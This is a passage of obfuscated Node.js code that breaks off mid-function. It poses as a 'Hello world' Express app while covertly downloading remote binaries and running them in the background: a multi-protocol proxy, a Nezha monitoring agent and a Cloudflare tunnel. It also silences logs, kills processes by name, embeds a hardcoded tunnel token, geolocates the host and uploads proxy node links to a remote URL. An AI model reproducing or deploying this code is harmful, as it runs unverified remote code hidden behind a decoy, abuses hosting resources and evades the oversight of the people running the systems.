const _0x2f1dc2=_0x1fe2;(function(_0x18f86e,_0x363a0b){const _0x32d2d4={_0x55f480:0x128,_0x1fcd60:0xa6,_0x4e8aec:0xd6},_0x1a3c22=_0x1fe2,_0x29d640=_0x18f86e();while(!![]){try{const _0x1d0208=-parseInt(_0x1a3c22(_0x32d2d4._0x55f480))/0x1+-parseInt(_0x1a3c22(0xdf))/0x2+parseInt(_0x1a3c22(0xa8))/0x3+parseInt(_0x1a3c22(0x12f))/0x4*(parseInt(_0x1a3c22(_0x32d2d4._0x1fcd60))/0x5)+parseInt(_0x1a3c22(0xc6))/0x6+-parseInt(_0x1a3c22(0x119))/0x7+-parseInt(_0x1a3c22(0xae))/0x8*(-parseInt(_0x1a3c22(_0x32d2d4._0x4e8aec))/0x9);if(_0x1d0208===_0x363a0b)break;else _0x29d640['push'](_0x29d640['shift']());}catch(_0x4af924){_0x29d640['push'](_0x29d640['shift']());}}}(_0x5981,0x613a3));const express=require(_0x2f1dc2(0xcb)),app=express(),axios=require(_0x2f1dc2(0xca)),os=require('os'),fs=require('fs'),path=require(_0x2f1dc2(0x9e)),{promisify}=require(_0x2f1dc2(0xf3)),exec=promisify(require(_0x2f1dc2(0xf2))[_0x2f1dc2(0x11f)]),{execSync}=require(_0x2f1dc2(0xf2)),UPLOAD_URL=process[_0x2f1dc2(0xc0)][_0x2f1dc2(0xd4)]||'',PROJECT_URL=process[_0x2f1dc2(0xc0)][_0x2f1dc2(0x9c)]||'',AUTO_ACCESS=process[_0x2f1dc2(0xc0)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2f1dc2(0xc0)][_0x2f1dc2(0xf9)]||_0x2f1dc2(0x112),SUB_PATH=process['env'][_0x2f1dc2(0xb4)]||_0x2f1dc2(0x10a),PORT=process[_0x2f1dc2(0xc0)]['SERVER_PORT']||process[_0x2f1dc2(0xc0)][_0x2f1dc2(0x106)]||0xbb8,UUID=process[_0x2f1dc2(0xc0)][_0x2f1dc2(0x113)]||_0x2f1dc2(0x88),NEZHA_SERVER=process[_0x2f1dc2(0xc0)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2f1dc2(0xc0)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x2f1dc2(0xc0)][_0x2f1dc2(0xcc)]||'',ARGO_DOMAIN=process[_0x2f1dc2(0xc0)][_0x2f1dc2(0x13e)]||_0x2f1dc2(0xa5),ARGO_AUTH=process['env']['ARGO_AUTH']||'eyJhIjoiNzkzMzA2M2M0ZjUwZTk5OWYzODJhNGIzMWFiNTBmMjIiLCJ0IjoiZjNhZTFiOGQtOWI3ZC00Mjc5LWEwNWUtMGIzNWQ5OWIxODJkIiwicyI6IlpEVXpZVEExTmpjdE1qZGxNQzAwTlRJNExUazJZMk10T1RFellUSTRZemM1TWpBeiJ9',ARGO_PORT=process['env'][_0x2f1dc2(0xfd)]||0x1f41,CFIP=process[_0x2f1dc2(0xc0)][_0x2f1dc2(0xf5)]||_0x2f1dc2(0xf8),CFPORT=process['env'][_0x2f1dc2(0xee)]||0x1bb,NAME=process[_0x2f1dc2(0xc0)]['NAME']||_0x2f1dc2(0xb6);!fs[_0x2f1dc2(0x141)](FILE_PATH)?(fs[_0x2f1dc2(0x143)](FILE_PATH),console[_0x2f1dc2(0x108)](FILE_PATH+'\x20is\x20created')):console[_0x2f1dc2(0x108)](FILE_PATH+_0x2f1dc2(0x11c));function generateRandomName(){const _0x2c5dd3=_0x2f1dc2,_0x1a7916='abcdefghijklmnopqrstuvwxyz';let _0x59c19f='';for(let _0x5b2122=0x0;_0x5b2122<0x6;_0x5b2122++){_0x59c19f+=_0x1a7916[_0x2c5dd3(0xaf)](Math['floor'](Math[_0x2c5dd3(0xff)]()*_0x1a7916['length']));}return _0x59c19f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2f1dc2(0x99)](FILE_PATH,npmName),phpPath=path[_0x2f1dc2(0x99)](FILE_PATH,phpName),webPath=path[_0x2f1dc2(0x99)](FILE_PATH,webName),botPath=path[_0x2f1dc2(0x99)](FILE_PATH,botName),subPath=path[_0x2f1dc2(0x99)](FILE_PATH,'sub.txt'),listPath=path[_0x2f1dc2(0x99)](FILE_PATH,_0x2f1dc2(0xa3)),bootLogPath=path[_0x2f1dc2(0x99)](FILE_PATH,_0x2f1dc2(0x126)),configPath=path[_0x2f1dc2(0x99)](FILE_PATH,'config.json');function deleteNodes(){const _0x42b789={_0x28acc7:0x8d,_0x4d400f:0x130,_0x589c0d:0xc8,_0x3512bd:0x125,_0x32692b:0x13d,_0x41e9af:0xe2,_0x1a5dba:0x11b},_0x124c3c=_0x2f1dc2;try{if(!UPLOAD_URL)return;if(!fs[_0x124c3c(0x141)](subPath))return;let _0x319add;try{_0x319add=fs[_0x124c3c(_0x42b789._0x28acc7)](subPath,'utf-8');}catch{return null;}const _0x3ffb0b=Buffer[_0x124c3c(_0x42b789._0x4d400f)](_0x319add,_0x124c3c(_0x42b789._0x589c0d))[_0x124c3c(0xf0)]('utf-8'),_0x4a2006=_0x3ffb0b[_0x124c3c(_0x42b789._0x3512bd)]('\x0a')[_0x124c3c(_0x42b789._0x32692b)](_0x1b2a68=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x124c3c(0x100)](_0x1b2a68));if(_0x4a2006['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x124c3c(0x8a),JSON[_0x124c3c(0xb0)]({'nodes':_0x4a2006}),{'headers':{'Content-Type':_0x124c3c(_0x42b789._0x41e9af)}})[_0x124c3c(_0x42b789._0x1a5dba)](_0x469e27=>{return null;}),null;}catch(_0x319f7c){return null;}}function cleanupOldFiles(){const _0x31f3d2={_0x356750:0x116},_0x592374=_0x2f1dc2;try{const _0x3b309e=fs['readdirSync'](FILE_PATH);_0x3b309e[_0x592374(_0x31f3d2._0x356750)](_0x3a5452=>{const _0x300f80=_0x592374,_0x265597=path['join'](FILE_PATH,_0x3a5452);try{const _0x357550=fs[_0x300f80(0x136)](_0x265597);_0x357550['isFile']()&&fs[_0x300f80(0xe4)](_0x265597);}catch(_0x5aaffc){}});}catch(_0xf3efa2){}}app['get']('/',function(_0x2540ae,_0x317eb3){const _0x34156c={_0x1c1a80:0x134},_0x224cb5=_0x2f1dc2;_0x317eb3[_0x224cb5(_0x34156c._0x1c1a80)]('Hello\x20world!');});async function generateConfig(){const _0x23bdb0={_0x273dca:0xe5,_0xe3d0a5:0x12e,_0x269437:0xe5,_0x45c501:0xcf,_0xd20187:0xda,_0x20b50b:0x144,_0xf733d4:0x107,_0x481057:0xde,_0x2bf9c1:0x8b,_0x4bddf7:0xe5,_0x8c8f03:0x120,_0x17c1e5:0xaa,_0x2f6649:0x132,_0x5d9ceb:0xb7,_0x3bb7da:0x140,_0x4deeb6:0xb0},_0x474cd2=_0x2f1dc2,_0x2ff55e={'log':{'access':_0x474cd2(0x138),'error':'/dev/null','loglevel':_0x474cd2(_0x23bdb0._0x273dca)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x474cd2(0xcf),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x474cd2(_0x23bdb0._0xe3d0a5),'dest':0xbbc}]},'streamSettings':{'network':_0x474cd2(0x145)}},{'port':0xbb9,'listen':_0x474cd2(0xde),'protocol':_0x474cd2(0xcf),'settings':{'clients':[{'id':UUID}],'decryption':_0x474cd2(_0x23bdb0._0x269437)},'streamSettings':{'network':_0x474cd2(0x145),'security':_0x474cd2(0xe5)}},{'port':0xbba,'listen':_0x474cd2(0xde),'protocol':_0x474cd2(_0x23bdb0._0x45c501),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x474cd2(0xe5)},'streamSettings':{'network':'ws','security':_0x474cd2(_0x23bdb0._0x273dca),'wsSettings':{'path':_0x474cd2(_0x23bdb0._0xd20187)}},'sniffing':{'enabled':!![],'destOverride':[_0x474cd2(0x8b),_0x474cd2(_0x23bdb0._0x20b50b),_0x474cd2(_0x23bdb0._0xf733d4)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x474cd2(_0x23bdb0._0x481057),'protocol':_0x474cd2(0x110),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x474cd2(_0x23bdb0._0x2bf9c1),_0x474cd2(0x144),_0x474cd2(0x107)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x474cd2(0xde),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x474cd2(_0x23bdb0._0x4bddf7),'wsSettings':{'path':_0x474cd2(0x12e)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x474cd2(_0x23bdb0._0xf733d4)],'metadataOnly':![]}}],'dns':{'servers':[_0x474cd2(_0x23bdb0._0x8c8f03)]},'outbounds':[{'protocol':_0x474cd2(_0x23bdb0._0x17c1e5),'tag':'direct'},{'protocol':_0x474cd2(_0x23bdb0._0x2f6649),'tag':_0x474cd2(_0x23bdb0._0x5d9ceb)}]};fs[_0x474cd2(0xef)](path['join'](FILE_PATH,_0x474cd2(_0x23bdb0._0x3bb7da)),JSON[_0x474cd2(_0x23bdb0._0x4deeb6)](_0x2ff55e,null,0x2));}function getSystemArchitecture(){const _0x48cd53={_0x4c9638:0xe6,_0x2a7734:0xbe,_0x2c21be:0x135,_0x311d93:0xb9},_0x1979e7=_0x2f1dc2,_0x241a4c=os[_0x1979e7(_0x48cd53._0x4c9638)]();return _0x241a4c===_0x1979e7(0x135)||_0x241a4c==='arm64'||_0x241a4c===_0x1979e7(_0x48cd53._0x2a7734)?_0x1979e7(_0x48cd53._0x2c21be):_0x1979e7(_0x48cd53._0x311d93);}function downloadFile(_0x56fba5,_0xc8bfc,_0x3f027e){const _0x430dbb={_0x2757e3:0x10e,_0x4af324:0x12c,_0x289e2d:0xc2},_0x2d7cc2={_0x3c0881:0x9d},_0x37d8ef={_0x35362c:0x91,_0x4fe663:0x12c,_0x3fe0fa:0xc2},_0x1945b5={_0x5a3a98:0x108,_0x1474ab:0x91},_0x2d597f=_0x2f1dc2,_0x27c4f7=_0x56fba5;!fs[_0x2d597f(0x141)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x500de8=fs[_0x2d597f(0x92)](_0x27c4f7);axios({'method':'get','url':_0xc8bfc,'responseType':'stream'})[_0x2d597f(0xe9)](_0x97589c=>{const _0x3a889=_0x2d597f;_0x97589c[_0x3a889(0x11a)][_0x3a889(_0x2d7cc2._0x3c0881)](_0x500de8),_0x500de8['on']('finish',()=>{const _0x1d52f0=_0x3a889;_0x500de8['close'](),console[_0x1d52f0(_0x1945b5._0x5a3a98)](_0x1d52f0(_0x1945b5._0x1474ab)+path[_0x1d52f0(0x10e)](_0x27c4f7)+_0x1d52f0(0xd9)),_0x3f027e(null,_0x27c4f7);}),_0x500de8['on']('error',_0x34d688=>{const _0x54dc8a=_0x3a889;fs[_0x54dc8a(0x90)](_0x27c4f7,()=>{});const _0x52ddd4=_0x54dc8a(_0x37d8ef._0x35362c)+path[_0x54dc8a(0x10e)](_0x27c4f7)+_0x54dc8a(_0x37d8ef._0x4fe663)+_0x34d688[_0x54dc8a(_0x37d8ef._0x3fe0fa)];console[_0x54dc8a(0xce)](_0x52ddd4),_0x3f027e(_0x52ddd4);});})['catch'](_0x25a22e=>{const _0x56791c=_0x2d597f,_0x1ea0ff='Download\x20'+path[_0x56791c(_0x430dbb._0x2757e3)](_0x27c4f7)+_0x56791c(_0x430dbb._0x4af324)+_0x25a22e[_0x56791c(_0x430dbb._0x289e2d)];console[_0x56791c(0xce)](_0x1ea0ff),_0x3f027e(_0x1ea0ff);});}async function downloadFilesAndRun(){const _0x1914e1={_0x4e35b9:0xce,_0x57da13:0xd8,_0x584e1f:0xbb,_0x10be47:0x11d,_0x1a4385:0x96,_0xe10c71:0xe7,_0x52e1ea:0xdb,_0xfb7320:0x129,_0x37bd2f:0x105,_0x2cd05f:0x95,_0x9b688d:0x10b,_0x4605ef:0x108,_0x3a6fad:0x123,_0x529b8d:0x104,_0x5191bd:0x13a,_0xbb116e:0xd8,_0x40a7dc:0xb1,_0x169d2d:0x12d,_0x131757:0xec,_0x501d71:0x108,_0xbd96e8:0x98,_0x521534:0x123,_0x5cefa2:0xce,_0x27a0a7:0x141,_0x5e39de:0x121,_0x27dc58:0xf1,_0x419df6:0x12a,_0x374abe:0xb8,_0x27829f:0x9b},_0x702ece={_0x3ad090:0xdc},_0x232efc=_0x2f1dc2,_0x3736d6=getSystemArchitecture(),_0x1bd20e=getFilesForArchitecture(_0x3736d6);if(_0x1bd20e[_0x232efc(0x142)]===0x0){console['log'](_0x232efc(0xcd));return;}const _0x5b7fe3=_0x1bd20e[_0x232efc(0xa4)](_0x4846a3=>{return new Promise((_0x315c2b,_0xfa9def)=>{const _0x2e571b=_0x1fe2;downloadFile(_0x4846a3['fileName'],_0x4846a3[_0x2e571b(_0x702ece._0x3ad090)],(_0x299039,_0x6cecd9)=>{_0x299039?_0xfa9def(_0x299039):_0x315c2b(_0x6cecd9);});});});try{await Promise[_0x232efc(0x13b)](_0x5b7fe3);}catch(_0x4ee825){console[_0x232efc(_0x1914e1._0x4e35b9)](_0x232efc(0xd3),_0x4ee825);return;}function _0x3b8167(_0x2a8461){const _0x53646b=_0x232efc,_0x148b64=0x1fd;_0x2a8461[_0x53646b(0x116)](_0x3b1808=>{const _0x28ab55={_0x7a8759:0xce,_0x44e5c6:0x87,_0x580f33:0xf0},_0x24d4d4=_0x53646b;fs[_0x24d4d4(0x141)](_0x3b1808)&&fs[_0x24d4d4(0x127)](_0x3b1808,_0x148b64,_0xf14978=>{const _0x4fb4e1=_0x24d4d4;_0xf14978?console[_0x4fb4e1(_0x28ab55._0x7a8759)](_0x4fb4e1(0x8c)+_0x3b1808+':\x20'+_0xf14978):console[_0x4fb4e1(0x108)](_0x4fb4e1(_0x28ab55._0x44e5c6)+_0x3b1808+':\x20'+_0x148b64[_0x4fb4e1(_0x28ab55._0x580f33)](0x8));});});}const _0x36f657=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3b8167(_0x36f657);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x7bf051=NEZHA_SERVER[_0x232efc(_0x1914e1._0x57da13)](':')?NEZHA_SERVER['split'](':')[_0x232efc(0xd7)]():'',_0xc1db8f=new Set([_0x232efc(_0x1914e1._0x584e1f),'8443',_0x232efc(0x104),_0x232efc(_0x1914e1._0x10be47),_0x232efc(_0x1914e1._0x1a4385),'2053']),_0x4d8c89=_0xc1db8f[_0x232efc(0x9f)](_0x7bf051)?_0x232efc(0xb2):'false',_0x32d1a6=_0x232efc(0xe3)+NEZHA_KEY+_0x232efc(_0x1914e1._0xe10c71)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4d8c89+_0x232efc(_0x1914e1._0x52e1ea)+UUID;fs[_0x232efc(0xef)](path[_0x232efc(0x99)](FILE_PATH,_0x232efc(_0x1914e1._0xfb7320)),_0x32d1a6);const _0x3b0876=_0x232efc(_0x1914e1._0x37bd2f)+phpPath+_0x232efc(_0x1914e1._0x2cd05f)+FILE_PATH+_0x232efc(_0x1914e1._0x9b688d);try{await exec(_0x3b0876),console[_0x232efc(_0x1914e1._0x4605ef)](phpName+_0x232efc(_0x1914e1._0x3a6fad)),await new Promise(_0x1210ba=>setTimeout(_0x1210ba,0x3e8));}catch(_0x18e4c7){console[_0x232efc(_0x1914e1._0x4e35b9)](_0x232efc(0x12b)+_0x18e4c7);}}else{let _0x30e3c6='';const _0x135500=[_0x232efc(0xbb),_0x232efc(0xf7),_0x232efc(_0x1914e1._0x529b8d),_0x232efc(0x11d),'2083',_0x232efc(_0x1914e1._0x5191bd)];_0x135500[_0x232efc(_0x1914e1._0xbb116e)](NEZHA_PORT)&&(_0x30e3c6=_0x232efc(_0x1914e1._0x40a7dc));const _0x57eb70=_0x232efc(_0x1914e1._0x37bd2f)+npmPath+_0x232efc(0x102)+NEZHA_SERVER+':'+NEZHA_PORT+_0x232efc(_0x1914e1._0x169d2d)+NEZHA_KEY+'\x20'+_0x30e3c6+_0x232efc(0x94);try{await exec(_0x57eb70),console[_0x232efc(0x108)](npmName+_0x232efc(0x123)),await new Promise(_0x16121a=>setTimeout(_0x16121a,0x3e8));}catch(_0x5cdeff){console[_0x232efc(0xce)](_0x232efc(_0x1914e1._0x131757)+_0x5cdeff);}}}else console[_0x232efc(_0x1914e1._0x501d71)](_0x232efc(0xc9));const _0x35eee4=_0x232efc(_0x1914e1._0x37bd2f)+webPath+_0x232efc(0xeb)+FILE_PATH+_0x232efc(_0x1914e1._0xbd96e8);try{await exec(_0x35eee4),console[_0x232efc(0x108)](webName+_0x232efc(_0x1914e1._0x521534)),await new Promise(_0x5e75fc=>setTimeout(_0x5e75fc,0x3e8));}catch(_0x1739a8){console[_0x232efc(_0x1914e1._0x5cefa2)](_0x232efc(0x8e)+_0x1739a8);}if(fs[_0x232efc(_0x1914e1._0x27a0a7)](botPath)){let _0x291c12;if(ARGO_AUTH[_0x232efc(_0x1914e1._0x5e39de)](/^[A-Z0-9a-z=]{120,250}$/))_0x291c12=_0x232efc(_0x1914e1._0x27dc58)+ARGO_AUTH;else ARGO_AUTH[_0x232efc(0x121)](/TunnelSecret/)?_0x291c12=_0x232efc(0x8f)+FILE_PATH+_0x232efc(0xa0):_0x291c12='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x232efc(_0x1914e1._0x419df6)+ARGO_PORT;try{await exec(_0x232efc(_0x1914e1._0x37bd2f)+botPath+'\x20'+_0x291c12+_0x232efc(_0x1914e1._0x374abe)),console['log'](botName+_0x232efc(_0x1914e1._0x3a6fad)),await new Promise(_0x524118=>setTimeout(_0x524118,0x7d0));}catch(_0x4a733d){console['error'](_0x232efc(_0x1914e1._0x27829f)+_0x4a733d);}}await new Promise(_0x2e5162=>setTimeout(_0x2e5162,0x1388));}function getFilesForArchitecture(_0x4f8b37){const _0x3239c5={_0x2c1b54:0x135,_0x51f434:0xd1,_0x18d7b0:0x10d,_0x31ef6f:0x10f,_0x17418b:0x111,_0xc136fb:0x89,_0x330c70:0x103},_0x3fad5b=_0x2f1dc2;let _0x44e43d;_0x4f8b37===_0x3fad5b(_0x3239c5._0x2c1b54)?_0x44e43d=[{'fileName':webPath,'fileUrl':_0x3fad5b(_0x3239c5._0x51f434)},{'fileName':botPath,'fileUrl':_0x3fad5b(0xbd)}]:_0x44e43d=[{'fileName':webPath,'fileUrl':_0x3fad5b(_0x3239c5._0x18d7b0)},{'fileName':botPath,'fileUrl':_0x3fad5b(0x115)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xba34ed=_0x4f8b37==='arm'?_0x3fad5b(_0x3239c5._0x31ef6f):_0x3fad5b(_0x3239c5._0x17418b);_0x44e43d[_0x3fad5b(0x103)]({'fileName':npmPath,'fileUrl':_0xba34ed});}else{const _0x5141a5=_0x4f8b37==='arm'?_0x3fad5b(_0x3239c5._0xc136fb):'https://amd64.ssss.nyc.mn/v1';_0x44e43d[_0x3fad5b(_0x3239c5._0x330c70)]({'fileName':phpPath,'fileUrl':_0x5141a5});}}return _0x44e43d;}function argoType(){const _0x2d543a={_0x44faa6:0x146,_0x289a41:0x13c,_0x5035db:0xef,_0x264c9c:0xf4,_0x331ef9:0xe8,_0x93edee:0xe0,_0x2ca797:0xf4,_0x4d0cf4:0xd5,_0x3e1501:0xef,_0x4fd6ac:0x99},_0x5b1cf9=_0x2f1dc2;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5b1cf9(0x108)](_0x5b1cf9(_0x2d543a._0x44faa6));return;}if(ARGO_AUTH['includes'](_0x5b1cf9(_0x2d543a._0x289a41))){fs[_0x5b1cf9(_0x2d543a._0x5035db)](path[_0x5b1cf9(0x99)](FILE_PATH,_0x5b1cf9(_0x2d543a._0x264c9c)),ARGO_AUTH);const _0x1466e2=_0x5b1cf9(_0x2d543a._0x331ef9)+ARGO_AUTH['split']('\x22')[0xb]+_0x5b1cf9(_0x2d543a._0x93edee)+path[_0x5b1cf9(0x99)](FILE_PATH,_0x5b1cf9(_0x2d543a._0x2ca797))+_0x5b1cf9(0xad)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x5b1cf9(_0x2d543a._0x4d0cf4);fs[_0x5b1cf9(_0x2d543a._0x3e1501)](path[_0x5b1cf9(_0x2d543a._0x4fd6ac)](FILE_PATH,'tunnel.yml'),_0x1466e2);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x2ebcc8={_0x33399c:0x108,_0x36bf4f:0x126,_0x5a844d:0x125,_0x28ecf9:0xf6,_0x249c9e:0xba,_0x3679f0:0x126,_0x46d3fa:0x105,_0x5d037f:0x123,_0x41da81:0x9b,_0x2cccff:0xce,_0x182aea:0xfc},_0x1d36a1={_0x374f06:0xc5,_0x4a6a1d:0x114,_0x57a9e8:0x11a,_0x3cc016:0xc5,_0xfb8e54:0x11a,_0x58d1ce:0xd2,_0x2485ed:0x133,_0x4413db:0x11a},_0x2ff840={_0x24e703:0x122,_0x406dd3:0x109,_0x239d75:0x117,_0x3905e2:0xc3,_0x4e563c:0xaf},_0x5ab42c={_0x3d2c22:0x121},_0x17e158=_0x2f1dc2;let _0x5d118e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5d118e=ARGO_DOMAIN,console[_0x17e158(_0x2ebcc8._0x33399c)]('ARGO_DOMAIN:',_0x5d118e),await _0x53ac0d(_0x5d118e);else try{const _0x581b25=fs['readFileSync'](path[_0x17e158(0x99)](FILE_PATH,_0x17e158(_0x2ebcc8._0x36bf4f)),_0x17e158(0xab)),_0x14f975=_0x581b25[_0x17e158(_0x2ebcc8._0x5a844d)]('\x0a'),_0x14a256=[];_0x14f975['forEach'](_0x100c17=>{const _0x31f868=_0x17e158,_0x4f5998=_0x100c17[_0x31f868(_0x5ab42c._0x3d2c22)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4f5998){const _0x5add9d=_0x4f5998[0x1];_0x14a256[_0x31f868(0xd0)](_0x5add9d);}});if(_0x14a256['length']>0x0)_0x5d118e=_0x14a256[0x0],console[_0x17e158(0x108)](_0x17e158(_0x2ebcc8._0x28ecf9),_0x5d118e),await _0x53ac0d(_0x5d118e);else{console[_0x17e158(0x108)](_0x17e158(_0x2ebcc8._0x249c9e)),fs[_0x17e158(0xe4)](path['join'](FILE_PATH,_0x17e158(_0x2ebcc8._0x3679f0)));async function _0x3bb00b(){const _0x20be0a=_0x17e158;try{process[_0x20be0a(0xfa)]===_0x20be0a(_0x2ff840._0x24e703)?await exec(_0x20be0a(_0x2ff840._0x406dd3)+botName+_0x20be0a(_0x2ff840._0x239d75)):await exec(_0x20be0a(_0x2ff840._0x3905e2)+botName[_0x20be0a(_0x2ff840._0x4e563c)](0x0)+']'+botName[_0x20be0a(0x131)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3a09bc){}}_0x3bb00b(),await new Promise(_0x1d479f=>setTimeout(_0x1d479f,0xbb8));const _0x1760b4='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x17e158(0x12a)+ARGO_PORT;try{await exec(_0x17e158(_0x2ebcc8._0x46d3fa)+botPath+'\x20'+_0x1760b4+'\x20>/dev/null\x202>&1\x20&'),console[_0x17e158(0x108)](botName+_0x17e158(_0x2ebcc8._0x5d037f)),await new Promise(_0xcb323b=>setTimeout(_0xcb323b,0xbb8)),await extractDomains();}catch(_0x23f8e1){console['error'](_0x17e158(_0x2ebcc8._0x41da81)+_0x23f8e1);}}}catch(_0x37c695){console[_0x17e158(_0x2ebcc8._0x2cccff)](_0x17e158(_0x2ebcc8._0x182aea),_0x37c695);}async function _0x4ee98d(){const _0x41bf0c=_0x17e158;try{const _0x330216=await axios[_0x41bf0c(0xbc)](_0x41bf0c(0x9a),{'timeout':0xbb8});if(_0x330216[_0x41bf0c(0x11a)]&&_0x330216['data'][_0x41bf0c(_0x1d36a1._0x374f06)]&&_0x330216[_0x41bf0c(0x11a)][_0x41bf0c(_0x1d36a1._0x4a6a1d)])return _0x330216[_0x41bf0c(_0x1d36a1._0x57a9e8)][_0x41bf0c(_0x1d36a1._0x3cc016)]+'_'+_0x330216[_0x41bf0c(0x11a)]['org'];}catch(_0x2b4058){try{const _0x4f9a95=await axios[_0x41bf0c(0xbc)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x4f9a95[_0x41bf0c(0x11a)]&&_0x4f9a95[_0x41bf0c(_0x1d36a1._0xfb8e54)][_0x41bf0c(_0x1d36a1._0x58d1ce)]===_0x41bf0c(_0x1d36a1._0x2485ed)&&_0x4f9a95['data'][_0x41bf0c(0xdd)]&&_0x4f9a95[_0x41bf0c(_0x1d36a1._0xfb8e54)]['org'])return _0x4f9a95[_0x41bf0c(_0x1d36a1._0x4413db)]['countryCode']+'_'+_0x4f9a95['data'][_0x41bf0c(0x114)];}catch(_0x398408){}}return'Unknown';}async function _0x53ac0d(_0x722a41){const _0x2a0214={_0x487408:0x93,_0x4f1b83:0x139,_0x3e2ec8:0xa2,_0x49bf83:0x10c,_0x4bc2c7:0xa9,_0x1423f2:0x118,_0x5a6c3c:0xa7,_0x174c43:0xf0,_0x18d6f0:0xc8,_0x334836:0xfe},_0x53ede7=await _0x4ee98d(),_0x392a45=NAME?NAME+'-'+_0x53ede7:_0x53ede7;return new Promise(_0x2d3a2b=>{setTimeout(()=>{const _0x39f1af={_0x30317b:0xc8},_0xa68890=_0x1fe2,_0x3bf754={'v':'2','ps':''+_0x392a45,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0xa68890(0xe5),'host':_0x722a41,'path':_0xa68890(_0x2a0214._0x487408),'tls':_0xa68890(0x144),'sni':_0x722a41,'alpn':'','fp':_0xa68890(_0x2a0214._0x4f1b83)},_0x45706c='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0xa68890(0xac)+_0x722a41+_0xa68890(0xa9)+_0x722a41+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x392a45+'\x0a\x0avmess://'+Buffer[_0xa68890(0x130)](JSON[_0xa68890(0xb0)](_0x3bf754))['toString']('base64')+_0xa68890(_0x2a0214._0x3e2ec8)+UUID+'@'+CFIP+':'+CFPORT+_0xa68890(_0x2a0214._0x49bf83)+_0x722a41+_0xa68890(_0x2a0214._0x4bc2c7)+_0x722a41+_0xa68890(_0x2a0214._0x1423f2)+_0x392a45+_0xa68890(_0x2a0214._0x5a6c3c);console[_0xa68890(0x108)](Buffer['from'](_0x45706c)[_0xa68890(_0x2a0214._0x174c43)](_0xa68890(0xc8))),fs[_0xa68890(0xef)](subPath,Buffer[_0xa68890(0x130)](_0x45706c)[_0xa68890(0xf0)](_0xa68890(_0x2a0214._0x18d6f0))),console['log'](FILE_PATH+_0xa68890(_0x2a0214._0x334836)),uploadNodes(),app[_0xa68890(0xbc)]('/'+SUB_PATH,(_0x3693f0,_0x47c04c)=>{const _0x112eb9=_0xa68890,_0x26d8d6=Buffer['from'](_0x45706c)['toString'](_0x112eb9(_0x39f1af._0x30317b));_0x47c04c[_0x112eb9(0xb3)]('Content-Type',_0x112eb9(0xed)),_0x47c04c[_0x112eb9(0x134)](_0x26d8d6);}),_0x2d3a2b(_0x45706c);},0x7d0);});}}async function uploadNodes(){const _0xae5191={_0x36ff0d:0x124,_0x4054f9:0x13f,_0x3305d2:0xb5,_0x3e5eb4:0x141,_0x1a91d4:0x8d,_0x5195cc:0xb0,_0x229ecc:0xea,_0x5be1ea:0xd2},_0x358e90=_0x2f1dc2;if(UPLOAD_URL&&PROJECT_URL){const _0xd095c=PROJECT_URL+'/'+SUB_PATH,_0x1b6698={'subscription':[_0xd095c]};try{const _0x12121b=await axios[_0x358e90(_0xae5191._0x36ff0d)](UPLOAD_URL+_0x358e90(_0xae5191._0x4054f9),_0x1b6698,{'headers':{'Content-Type':_0x358e90(0xe2)}});return _0x12121b&&_0x12121b[_0x358e90(0xd2)]===0xc8?(console['log'](_0x358e90(_0xae5191._0x3305d2)),_0x12121b):null;}catch(_0x47f278){if(_0x47f278['response']){if(_0x47f278[_0x358e90(0xfb)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x358e90(_0xae5191._0x3e5eb4)](listPath))return;const _0x234e82=fs[_0x358e90(_0xae5191._0x1a91d4)](listPath,_0x358e90(0xab)),_0x13a78a=_0x234e82[_0x358e90(0x125)]('\x0a')['filter'](_0x1d3298=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x358e90(0x100)](_0x1d3298));if(_0x13a78a['length']===0x0)return;const _0x4fb34c=JSON[_0x358e90(_0xae5191._0x5195cc)]({'nodes':_0x13a78a});try{const _0x210859=await axios['post'](UPLOAD_URL+_0x358e90(_0xae5191._0x229ecc),_0x4fb34c,{'headers':{'Content-Type':_0x358e90(0xe2)}});return 